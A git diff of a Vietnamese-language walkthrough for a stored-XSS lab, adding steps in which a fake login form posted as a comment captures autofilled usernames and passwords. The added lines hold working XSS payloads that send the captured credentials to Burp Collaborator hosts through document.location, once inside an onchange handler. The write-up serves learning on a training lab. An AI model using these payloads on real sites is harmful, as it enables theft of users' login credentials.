@@ -69,8 +69,23 @@ Sau khi poll thì chúng ta nhận được giá trị cookie trong phần reque
 Đây là một challenge liên quan đến store XSS tức là đoạn mã javascript sẽ được lưu lại kể cả sau khi session hết hạn. 
 
 Để lấy username và password của người dùng thì chúng ta cần tạo 1 form login giả ở phần bình luận mục đích là lừa người dùng, vì chúng ta có thể chèn trực tiếp mã JS mà không bị encode các kí tự đặc biệt
-![image](https://user-images.githubusercontent.com/68894302/171686869-bfecce51-6015-4256-8477-9f445abc5690.png)
 
+```
+<input required="" type="text" name="username">
+<input required="" type="password" name="password">
+<script>document.location='http://pa3atd45zyl03tnxu6h7lw42ctik69.burpcollaborator.net/?'+document.getElementsByName("username")[0].value+'&password='+document.getElementsByName("password")[0].value</script>
+```
+Nhưng nhận được kết quả chưa có thông tin gì về username và password có thể do quá trình tạo `document.location` tính năng tự động điền chưa được thực hiện.
+![image](https://user-images.githubusercontent.com/68894302/170563118-1459c91e-e626-4d26-8ed9-92baaf1a5e77.png)
+Dùng thuộc tính `onchange` vào trong thẻ input của password để quan sát sự thay đổi .
+```
+<input required="" type="text" name="username">
+<input required="" type="password" name="password" onchange="document.location='http://0421a7pdyngvuefhurnsavp12s8iw7.burpcollaborator.net/?user='+document.getElementsByName('username')[0].value+'pass='+document.getElementsByName('password')[0].value">
+```
+Và chúng ta nhận được thông tin về username và password
+![image](https://user-images.githubusercontent.com/68894302/170564092-867762cb-f694-4cd1-a3d0-8763dd067b5f.png)
+
+> Cách làm khác
 
 ```
 <input required type="username" name="username" id="username">
@@ -88,6 +103,7 @@ Lí do dùng `onblur` vì nó sẽ thực thi hàm JS khi người dùng break r
 Từ script đó chúng ta có được password của administrator qua burp collab
 
 ![image](https://user-images.githubusercontent.com/68894302/171696876-e83c9885-8d60-4b4c-926e-fba6b1a3829c.png)
+
 ---
 ## Lab: Exploiting XSS to perform CSRF
 
